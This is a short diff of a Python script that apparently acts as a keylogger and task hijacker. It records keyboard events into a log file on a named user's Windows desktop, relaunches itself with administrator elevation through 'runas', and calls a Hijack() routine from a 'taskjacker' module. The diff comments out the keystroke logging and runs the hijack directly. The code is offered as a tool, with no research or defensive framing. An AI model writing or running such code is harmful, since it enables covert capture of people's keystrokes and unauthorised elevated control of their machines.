@@ -7,9 +7,8 @@ from taskjacker import Hijack
 output = open(join('C:/Users/lhill23/Desktop', 'log.txt'), 'w')
 c = (ctypes.windll.shell32)
 #Applications infact do not get left alone by UAC if launched as admin. Screw you dude on stack overflow thread from 7 years ago, its you and not 7 years
-def start():
-    Hijack()
-    r = record(until='`')
+def Log():
+    r = record(until='|')
     r = str(r)
     r = r.replace("KeyboardEvent(", '')
     r = r.replace(',', '')
@@ -20,4 +19,5 @@ def start():
 if __name__ == "__main__":
     if not c.IsUserAnAdmin():
         c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None)
-    start()
+    Hijack()
+    #Log()
